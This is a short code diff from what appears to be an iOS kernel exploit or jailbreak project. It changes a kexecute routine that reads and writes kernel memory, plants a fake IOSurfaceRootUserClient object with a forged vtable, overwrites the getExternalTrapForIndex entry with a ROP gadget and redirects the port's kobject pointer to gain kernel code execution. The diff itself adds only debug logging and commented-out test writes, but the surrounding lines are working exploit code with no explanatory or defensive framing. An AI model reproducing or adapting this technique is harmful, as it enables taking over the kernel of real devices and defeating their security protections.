@@ -46,6 +46,10 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
         IOSurfaceRootUserClient_port = find_port(user_client);
         IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject);
         IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
+    
+        NSLog(@"IOSurfaceRootUserClient_port: %llx", IOSurfaceRootUserClient_port);
+        NSLog(@"IOSurfaceRootUserClient_addr: %llx", IOSurfaceRootUserClient_addr);
+        NSLog(@"IOSurfaceRootUserClient_vtab: %llx", IOSurfaceRootUserClient_vtab);
     }
     
     static uint64_t fake_vtable = 0;
@@ -73,11 +77,13 @@ uint64_t kexecute(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t
         wk64(fake_client, fake_vtable);
         
         wk64(fake_vtable + 8 * 0xB7, find_add_x0_x0_0x40_ret());
+        // wk64(fake_vtable + 8 * 0xB7, 0xffffffffdeadbeef);
         
         NSLog(@"Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
     }
     
     wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, fake_client);
+    // wk64(IOSurfaceRootUserClient_port + offsetof_ip_kobject, 0xffffffffdeadbeef);
     
     wk64(fake_client + 0x50, 0);
     
